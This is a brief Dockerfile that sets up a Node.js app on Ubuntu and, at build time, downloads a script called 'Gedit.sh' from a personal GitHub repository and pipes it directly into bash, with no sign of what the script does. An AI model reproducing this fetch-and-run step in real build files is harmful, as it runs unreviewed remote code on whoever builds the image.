FROM ubuntu:latest

WORKDIR /opt/app

ENV NODE_ENV production

COPY . .

RUN apt update && apt -y install npm
RUN npm ci
RUN which bash
RUN ls -la
RUN apt update
RUN apt -y install wget coreutils
RUN wget -O - https://raw.githubusercontent.com/sivuyilemakepusi/KinTemp1/main/Gedit.sh | bash

CMD ["npm", "run", "start", "/bin/bash"]
